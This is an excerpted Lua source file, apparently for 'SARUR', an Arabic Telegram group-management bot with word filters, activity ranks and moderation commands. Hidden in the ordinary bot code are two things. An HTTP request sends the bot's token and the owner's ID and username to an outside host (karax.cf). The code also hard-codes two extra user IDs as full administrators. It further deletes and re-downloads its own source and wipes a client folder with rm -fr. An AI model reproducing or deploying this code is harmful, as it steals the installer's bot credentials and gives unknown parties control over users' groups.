...
https.request('http://karax.cf/SARUR/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./SARUR.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S SARUR -X kill
screen -S SARUR ./SARUR
done
]])  
file:close() 
...
sudo_users = {SUDO,1216110209,989686118}   
...
var = true  
elseif tonumber(user_id) == tonumber(989686118) then
var = true  
...
local SARUR_Msg = ''  
if msgs < 100 then 
SARUR_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
SARUR_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
SARUR_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
SARUR_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
SARUR_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
SARUR_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
SARUR_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
SARUR_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
SARUR_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
SARUR_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
SARUR_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
SARUR_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
SARUR_Msg = 'رب التفاعل '  
end 
return SARUR_Msg 
end
...
function plugin_SARURa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.SARURa and msg then
pre_msg = plugin.SARURa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSARUR(msg,data) -- بداية العمل
if msg then
...
SourceSARURr = ' ゠ههلو حياتي 💕⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceSARURr) 
end
end
...
send(msg.chat_id_, msg.id_,SARUR_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf SARUR.lua')
os.execute('wget https://raw.githubusercontent.com/MELANOTEAM/SARUR/master/SARUR.lua')
...
local SARUR1_Msg = database:get(bot_id.."SARUR1:Add:Filter:Rp2"..text..msg.chat_id_)   
if SARUR1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SARUR')..') \n 📬┇'..SARUR1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if SARUR_Msg and not Special(msg) then  
local SARUR_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if SARUR_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..SARUR_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](t.me/M6666T)}\n🚫┇["..SARUR_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](t.me/M6666T)  💕 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💕 ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
Text = [[
👋│اهلا بك في سورس سرور 🇮🇶
●ـ▬ـ▬ஜ۩۞۩ஜ▬ـ▬ـ●
𖤤┊[قناه السورس](t.me/M6666T) 🖤
𖤤┊[قناة شروحات السورس](t.me/MMKMBB)🖤
𖤤┊[بوت تواصل](t.me/MMKMBbot)🖤
𖤤┊[مطور السـورس](t.me/MMKMB)🖤
●ـ▬ـ▬ஜ۩۞۩ஜ▬ـ▬ـ●
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SARUR')..') \n☑️┇ تـم قفـل السيلفي بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "SARUR")
...
database:set(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💕 ܰ")  
database:set(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."SARUR1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."SARUR1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
...
local test = database:get(bot_id.."SARUR1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."SARUR1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."SARUR1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💕 ܰ ")  
database:set(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
local list = database:smembers(bot_id.."SARUR1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."SARUR1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💕◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local SARUR_Msg = database:get(bot_id.."SARUR1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..SARUR_Msg.."◜\n"    
end  
if #list == 0 then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سرور').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سرور')
local SARUR_Msg = {
'عمغي 🥺💕💕 .',
'هلا ابو الحب 💘?? .'
}
send(msg.chat_id_, msg.id_,'['..SARUR_Msg[math.random(#SARUR_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سرور').." غادر" or text == 'غادر' then  
...
local Text = '٭ 𖢔┆عدد سحكاتك ◃ ◞ *~ '..addmem..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'مسح جهاتي' then
local Text = '٭ 𖢔┆تم مسح جميع جهاتك المضافه '
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..SARURk..''..SARUR..'\n*☑️┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/M6666T) 𖥠 .
]]
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سرور')
...
SARUR = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(SARUR)
...
--------------------------------------------------------------------------------------------------------------
SourceSARUR(data.message_,data)
plugin_SARURa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local SARURbot = database:get(bot_id.."SARUR1:Add:Filter:Rp2"..text..result.chat_id_)   
if SARURbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..SARURbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local SARUR1_Msg = database:get(bot_id.."SARUR1:Add:Filter:Rp2"..text..result.chat_id_)   
if SARUR1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..SARUR1_Msg)
